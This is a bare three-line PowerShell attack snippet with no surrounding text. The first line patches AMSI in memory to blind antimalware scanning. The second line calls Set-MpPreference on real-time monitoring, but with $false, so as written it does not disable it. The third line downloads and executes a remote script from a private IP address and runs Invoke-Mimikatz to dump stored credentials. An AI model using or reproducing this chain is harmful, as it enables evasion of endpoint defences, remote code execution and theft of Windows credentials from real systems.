[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
Set-MpPreference -DisableRealtimeMonitoring $false
IEX (New-Object Net.WebClient).DownloadString('http://172.16.126.141:8000/mimiStage2.ps1'); Invoke-Mimikatz -DumpCreds
